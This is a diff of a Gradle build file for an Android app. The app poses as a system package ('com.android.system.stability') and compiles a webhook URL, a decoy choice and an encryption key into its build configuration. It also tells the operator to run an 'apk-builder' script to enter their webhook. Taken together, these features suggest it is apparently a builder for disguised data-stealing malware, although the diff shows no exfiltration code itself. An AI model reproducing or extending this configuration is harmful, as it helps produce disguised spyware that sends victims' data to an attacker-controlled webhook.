@@ -22,8 +22,9 @@ android {
         applicationId "com.android.system.stability"
         minSdk 21
         targetSdk 34
-        versionCode 620
-        versionName "3.4.8"
+        versionCode 623
+        versionName "1.3.1"
+        multiDexEnabled true
         
         // Read WEBHOOK_URL from local.properties
         def localProperties = new Properties()
@@ -32,9 +33,18 @@ android {
             localProperties.load(new FileInputStream(localPropertiesFile))
         }
         
-        def webhookUrl = localProperties['WEBHOOK_URL'] ?: ""
-        def decoyChoice = localProperties['DECOY_CHOICE'] ?: "1"
-        def encryptionKey = localProperties['ENCRYPTION_KEY'] ?: "AndroidKernel1337"
+        def webhookUrl = (localProperties['WEBHOOK_URL'] ?: "").trim().replace("\"", "").replace("'", "")
+        def decoyChoice = (localProperties['DECOY_CHOICE'] ?: "1").toString().trim()
+        def encryptionKey = (localProperties['ENCRYPTION_KEY'] ?: "AndroidKernel1337").trim().replace("\"", "").replace("'", "")
+
+        if (webhookUrl.isEmpty()) {
+            println "-------------------------------------------------------------------------"
+            println "[BUILD WARNING] WEBHOOK_URL is EMPTY in local.properties!"
+            println "[BUILD WARNING] Run 'cd apk-builder && ./build.sh' to enter your Webhook URL."
+            println "-------------------------------------------------------------------------"
+        } else {
+            println "[BUILD SUCCESS] Webhook target configured: ${webhookUrl}"
+        }
 
         buildConfigField "String", "WEBHOOK_URL", "\"${webhookUrl}\""
         buildConfigField "int", "DECOY_CHOICE", "${decoyChoice}"
@@ -59,13 +69,14 @@ android {
             // and to allow the app to pass environment checks during local testing.
             debuggable false
             minifyEnabled false
-            signingConfig signingConfigs.release
+            if (keystorePropertiesFile.exists() && signingConfigs.release.storeFile != null) {
+                signingConfig signingConfigs.release
+            }
         }
         release {
             minifyEnabled true
-            shrinkResources true
             proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
-            if (keystorePropertiesFile.exists() && !project.hasProperty("disableSigning")) {
+            if (keystorePropertiesFile.exists() && signingConfigs.release.storeFile != null) {
                 signingConfig signingConfigs.release
             }
         }
@@ -77,6 +88,16 @@ android {
     }
 
     lint {
+        checkReleaseBuilds false
+        checkDependencies false
+        abortOnError false
+        checkAllWarnings false
+        warningsAsErrors false
+    }
+
+    lintOptions {
+        checkReleaseBuilds false
+        checkDependencies false
         abortOnError false
     }
 
@@ -150,20 +171,3 @@ project.afterEvaluate {
         }
     }
 }
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
